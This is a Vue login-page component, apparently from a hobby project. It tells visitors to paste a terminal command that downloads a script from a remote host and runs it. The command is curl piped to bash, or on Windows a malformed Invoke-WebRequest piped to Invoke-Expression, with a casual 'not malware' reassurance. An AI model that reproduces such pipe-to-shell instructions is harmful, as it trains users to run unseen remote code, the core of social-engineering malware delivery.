<script lang="ts" setup>
import generateRandomString from "@/lib/generateRandomString";
const isWindows = ref(false);
const requestString = ref("");
onMounted(() => {
    if (navigator.userAgent.includes("Windows")) {
        isWindows.value = true;
    }
    const browserID = localStorage.getItem("browserID");
    const randomString = generateRandomString(20);
    if (!browserID || !browserID.match(/^[a-zA-Z0-9-_.]{20}$/)) {
        requestString.value = randomString;
        localStorage.setItem("browserID", randomString);
    } else {
        requestString.value = browserID;
    }
});

const getLoginHook = () => {};

const checkIfUserIsDone = async () => {
    const req = await fetch("/api/ditchcopypaste");
    const res = await req.json();
};
</script>
<template>
    <div class="flex flex-col">
        <h2>
            Welcome to the bottle! Please login or signup for an account! You
            can do both here!
        </h2>
        <span
            >Copy and paste this to your fav terminal! dw the code is open
            source and not malware.</span
        >
        <br />
        <code v-if="isWindows">
            Invoke-WebRequest
            https://funlogin.vrl.yhw.tw/download/account-verify |
            Invoke-Expression --client=codecodecode
        </code>
        <code v-else>
            curl -s https://funlogin.vrl.yhw.tw/download/account-verify | bash
            -s -- --client=codecodecode
        </code>
        <button @click="checkIfUserIsDone">Check request</button>
    </div>
</template>
